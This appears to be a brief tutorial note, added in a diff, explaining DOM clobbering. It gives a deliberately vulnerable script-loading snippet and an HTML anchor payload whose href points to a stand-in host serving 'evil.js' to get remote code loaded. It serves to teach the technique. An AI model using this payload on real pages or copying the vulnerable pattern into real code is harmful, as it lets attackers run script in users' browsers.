@@ -1,0 +1,19 @@
+DOM clobbering is a technique in which you inject HTML into a page to manipulate the DOM and change the behavior of JavaScript on the page.
+DOM clobbering is particularly useful in cases where XSS is not possible, but you can control some HTML on a page where the attributes id or name are whitelisted by the HTML filter.
+
+example of vulnerable code:
+<script>
+    window.onload = function(){
+        let someObject = window.someObject || {};
+        let script = document.createElement('script');
+        script.src = someObject.url;
+        document.body.appendChild(script);
+    };
+</script>
+
+you can inject some html to clobber the someObject with an anchor element:
+
+<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>
+
+As the two anchors use the same ID, the DOM groups them together in a DOM collection. The DOM clobbering vector then overwrites the someObject reference with this DOM collection. 
+A name attribute is used on the last anchor element in order to clobber the url property of the someObject object, which points to an external script. 
